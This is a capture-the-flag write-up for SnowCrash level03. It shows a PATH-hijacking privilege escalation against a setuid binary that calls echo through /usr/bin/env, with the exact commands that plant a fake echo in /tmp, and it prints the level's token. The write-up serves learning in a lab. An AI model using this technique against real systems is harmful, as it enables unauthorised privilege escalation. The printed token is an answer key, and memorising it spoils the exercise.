# 🚩 SnowCrash — Level03

## 🎯 Goal

Find the password for **flag03**.

---

## 1. Check the current directory

```bash
ls -la
```

**Result:**

```
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
```

The `s` in `-rwsr-sr-x` indicates this is a **setuid binary** that runs with **flag03** privileges.

**What is setuid?**
- **setuid** (Set User ID) is a special permission on executable files
- When a setuid binary is executed, it runs with the privileges of the file's **owner** (flag03), not the user who runs it
- The `s` replaces the `x` in the owner's execute permission: `rws` instead of `rwx`
- This allows regular users to temporarily gain elevated privileges to perform specific tasks

---

## 2. Analyze the binary

```bash
strings level03
```

**Key finding:**

```
/usr/bin/env echo Exploit me
```

The binary calls `echo` using `/usr/bin/env`, which searches for `echo` in the **PATH** environment variable.

---

## 3. Exploit via PATH manipulation

**The vulnerability:** The binary uses `/usr/bin/env echo` instead of calling `echo` with an absolute path like `/bin/echo`.

`/usr/bin/env` searches for commands in the **PATH** environment variable, which we can manipulate. This allows us to create our own malicious `echo` that will be executed instead.

**Secure alternative:** The binary should use `/bin/echo` directly to avoid PATH hijacking.

**Steps:**

```bash
cd /tmp
echo "/bin/getflag" > echo
chmod +x echo
export PATH=/tmp:$PATH
cd ~
./level03
```

**Explanation:**
1. Create a fake `echo` script in `/tmp` that runs `getflag`
2. Make it executable
3. Modify PATH to search `/tmp` first
4. Run the setuid binary
5. It executes our malicious `echo` with **flag03** privileges

---

## ✅ Result

```bash
./level03
```

Output:

```
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

---

## 🎉 **Final Token for Level03**

```
qi0maab88jeaj46qoumi7maus
```
